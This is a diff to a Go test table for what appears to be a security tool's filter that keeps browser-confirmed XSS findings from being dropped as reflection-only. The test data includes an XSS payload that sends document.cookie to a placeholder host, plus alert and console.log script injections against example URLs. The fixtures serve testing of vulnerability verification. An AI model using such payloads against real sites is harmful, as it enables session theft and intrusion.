@@ -286,6 +286,25 @@ func TestCheckFalsePositive_XSSReflectionOnly(t *testing.T) {
 			"Payload <script>new Image().src='//x/?c='+document.cookie</script> fired and exfiltrated the session cookie",
 			false,
 		},
+		// Browser verifier (verify_xss) confirmation, verbatim, alongside the
+		// reflected payload the agent pastes → NOT rejected. This is the exact
+		// shape that was wrongly dropped as reflection-only before the fix.
+		{
+			"browser-confirmed xss (dialog) not rejected",
+			"Reflected XSS in q parameter (browser-confirmed execution)",
+			"q parameter executes a script",
+			"high",
+			`Browser-confirmed XSS: a dialog:alert dialog carrying the nonce "XV-8f3a" fired while loading https://app.example.com/search?q=<script>alert('XV-8f3a')</script>. Recorded in the ledger.`,
+			false,
+		},
+		{
+			"browser-confirmed xss (console/dom marker) not rejected",
+			"Reflected XSS (browser-confirmed)",
+			"payload executes",
+			"medium",
+			`Browser-confirmed XSS: a console:log dialog carrying the nonce "XV-77" fired while loading https://app/x?p=<img src=x onerror=console.log('XV-77')>.`,
+			false,
+		},
 		// Low/info severity → gate does not apply.
 		{
 			"reflection only but info severity",
